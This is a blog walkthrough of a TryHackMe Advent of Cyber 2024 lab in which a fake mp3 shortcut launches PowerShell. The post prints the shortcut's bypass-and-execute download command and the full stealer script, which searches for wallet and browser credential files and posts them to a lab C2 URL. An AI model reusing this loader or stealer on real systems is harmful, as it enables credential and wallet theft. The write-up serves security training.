---
title: "Advent of Cyber - Day 01 "
date: 2024-12-06 12:00:00 -500 
categories: [Advent of Cyber - Tryhackme, Day 01]
tags: [siem,exploit,flags,tryhackme,pentesting]
author: Christoph K
---
[Advent of Cyber - Day 01  ](https://tryhackme.com/r/room/adventofcyber2024)


## Intrduction

![Story](assets/img/tryhackme/cyberadvent/day01/01.png )




## Tasks
- Looks like the song.mp3 file is not what we expected! Run "exiftool song.mp3" in your terminal to find out the author of the song. Who is the author? 
- The malicious PowerShell script sends stolen info to a C2 server. What is the URL of this C2 server?
- Who is M.M? Maybe his Github profile page would provide clues?
- What is the number of commits on the GitHub repo where the issue was raised?

###  Looks like the song.mp3 file is not what we expected! Run "exiftool song.mp3" in your terminal to find out the author of the song. Who is the author? 

First we have to use the *not suspicious at all* website to download a converted track:

![Youtube-Download](assets/img/tryhackme/cyberadvent/day01/02.png )

We get a zip file, which we have to unzip:

```bash


┌──(admin㉿PREDATOR-01)-[~/Desktop/thm/day01]
└─$ ls
download.zip

┌──(admin㉿PREDATOR-01)-[~/Desktop/thm/day01]
└─$ unzip download.zip
Archive:  download.zip
 extracting: song.mp3
 extracting: somg.mp3

┌──(admin㉿PREDATOR-01)-[~/Desktop/thm/day01]
└─$

```

To check what type of file we have here, we can use `file`:

```bash
┌──(admin㉿PREDATOR-01)-[~/Desktop/thm/day01]
└─$ file song.mp3
song.mp3: Audio file with ID3 version 2.3.0, contains: MPEG ADTS, layer III, v1, 192 kbps, 44.1 kHz, Stereo

┌──(admin㉿PREDATOR-01)-[~/Desktop/thm/day01]
└─$ file somg.mp3
somg.mp3: MS Windows shortcut, Item id list present, Points to a file or directory, Has Relative path, Has Working directory, Has command line arguments, Unicoded, MachineID win-base-2019, EnableTargetMetadata KnownFolderID 1AC14E77-02E7-4E5D-B744-2EB1AE5198B7, Archive, ctime=Sat Sep 15 06:14:14 2018, atime=Sat Sep 15 06:14:14 2018, mtime=Sat Sep 15 06:14:14 2018, length=448000, window=normal, IDListSize 0x020d, Root folder "20D04FE0-3AEA-1069-A2D8-08002B30309D", Volume "C:\", LocalBasePath "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
```
This is very interesting, `somg.mp3` seems to be a executable windows file instead a track.


Lets use `exiftool` to find out the author of the song.


```bash

┌──(admin㉿PREDATOR-01)-[~/Desktop/thm/day01]
└─$ exiftool song.mp3
ExifTool Version Number         : 13.00
File Name                       : song.mp3
Directory                       : .
File Size                       : 4.6 MB
File Modification Date/Time     : 2024:10:24 09:50:46+02:00
File Access Date/Time           : 2024:12:08 09:42:54+01:00
File Inode Change Date/Time     : 2024:12:08 09:42:31+01:00
File Permissions                : -rwxrwxr-x
File Type                       : MP3
File Type Extension             : mp3
MIME Type                       : audio/mpeg
MPEG Audio Version              : 1
Audio Layer                     : 3
Audio Bitrate                   : 192 kbps
Sample Rate                     : 44100
Channel Mode                    : Stereo
MS Stereo                       : Off
Intensity Stereo                : Off
Copyright Flag                  : False
Original Media                  : False
Emphasis                        : None
ID3 Size                        : 2176
Artist                          : Tyler Ramsbey
Album                           : Rap
Title                           : Mount HackIt
Encoded By                      : Mixcraft 10.5 Recording Studio Build 621
Year                            : 2024
Genre                           : Rock
Track                           : 0/1
Comment                         :
Date/Time Original              : 2024

```

Anwer: `Tyler Ramsbey`


### The malicious PowerShell script sends stolen info to a C2 server. What is the URL of this C2 server?


We use again `exiftool`to find out more about the file and read the meta information:

```bash

┌──(admin㉿PREDATOR-01)-[~/Desktop/thm/day01]
└─$ exiftool somg.mp3
ExifTool Version Number         : 13.00
File Name                       : somg.mp3
Directory                       : .
File Size                       : 2.2 kB
File Modification Date/Time     : 2024:10:30 14:32:52+01:00
File Access Date/Time           : 2024:12:08 09:43:00+01:00
File Inode Change Date/Time     : 2024:12:08 09:42:31+01:00
File Permissions                : -rw-rw-r--
File Type                       : LNK
File Type Extension             : lnk
MIME Type                       : application/octet-stream
Flags                           : IDList, LinkInfo, RelativePath, WorkingDir, CommandArgs, Unicode, TargetMetadata
File Attributes                 : Archive
Create Date                     : 2018:09:15 09:14:14+02:00
Access Date                     : 2018:09:15 09:14:14+02:00
Modify Date                     : 2018:09:15 09:14:14+02:00
Target File Size                : 448000
Icon Index                      : (none)
Run Window                      : Normal
Hot Key                         : (none)
Target File DOS Name            : powershell.exe
Drive Type                      : Fixed Disk
Drive Serial Number             : A8A4-C362
Volume Label                    :
Local Base Path                 : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Relative Path                   : ..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Working Directory               : C:\Windows\System32\WindowsPowerShell\v1.0
Command Line Arguments          : -ep Bypass -nop -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1','C:\ProgramData\s.ps1'); iex (Get-Content 'C:\ProgramData\s.ps1' -Raw)"

```

As we can see, the file downloads the script from here;  'https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1' Lets check the script:



```powershell

└─$ curl 'https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1'
function Print-AsciiArt {
    Write-Host "  ____     _       ___  _____    ___    _   _ "
    Write-Host " / ___|   | |     |_ _||_   _|  / __|  | | | |"
    Write-Host "| |  _    | |      | |   | |   | |     | |_| |"
    Write-Host "| |_| |   | |___   | |   | |   | |__   |  _  |"
    Write-Host " \____|   |_____| |___|  |_|    \___|  |_| |_|"

    Write-Host "         Created by the one and only M.M."
}

# Call the function to print the ASCII art
Print-AsciiArt

# Path for the info file
$infoFilePath = "stolen_info.txt"

# Function to search for wallet files
function Search-ForWallets {
    $walletPaths = @(
        "$env:USERPROFILE\.bitcoin\wallet.dat",
        "$env:USERPROFILE\.ethereum\keystore\*",
        "$env:USERPROFILE\.monero\wallet",
        "$env:USERPROFILE\.dogecoin\wallet.dat"
    )
    Add-Content -Path $infoFilePath -Value "`n### Crypto Wallet Files ###"
    foreach ($path in $walletPaths) {
        if (Test-Path $path) {
            Add-Content -Path $infoFilePath -Value "Found wallet: $path"
        }
    }
}

# Function to search for browser credential files (SQLite databases)
function Search-ForBrowserCredentials {
    $chromePath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"
    $firefoxPath = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\logins.json"

    Add-Content -Path $infoFilePath -Value "`n### Browser Credential Files ###"
    if (Test-Path $chromePath) {
        Add-Content -Path $infoFilePath -Value "Found Chrome credentials: $chromePath"
    }
    if (Test-Path $firefoxPath) {
        Add-Content -Path $infoFilePath -Value "Found Firefox credentials: $firefoxPath"
    }
}

# Function to send the stolen info to a C2 server
function Send-InfoToC2Server {
    $c2Url = "http://papash3ll.thm/data"
    $data = Get-Content -Path $infoFilePath -Raw

    # Using Invoke-WebRequest to send data to the C2 server
    Invoke-WebRequest -Uri $c2Url -Method Post -Body $data
}

# Main execution flow
Search-ForWallets
Search-ForBrowserCredentials
Send-InfoToC2Server

```

When we read carefullly the script we can see., that `http://papash3ll.thm/data"` is the C2 Server.

Answer`http://papash3ll.thm/data"`


### Who is M.M? Maybe his Github profile page would provide clues?

Lets check the `github` page and find out who did this.

![github-profile](assets/img/tryhackme/cyberadvent/day01/03.png)

Answer: `Mayor Malware`


### What is the number of commits on the GitHub repo where the issue was raised?


We need to dig further into the repo from `Mayor Malware`. We have to search for his `repo` and can check the `insights` to find out, how many `commits` there have been:

[github-profile](assets/img/tryhackme/cyberadvent/day01/04.png)


Answer: `1 `



## Thoughts:

Very easy but funny room to understand what `OPSEC` is. The goal is to identify and eliminate potential vulnerabilities before the attacker can learn their identity.
Some of those `OPSEC`mistakes are:
- reusing `usernames, email addresses or similar`
- using identifiable metadata in `code, documents or images` 
- posting piblicly on forums or GitHub (Like this scenario)
- Failing to use a `VPN` or `proxy`


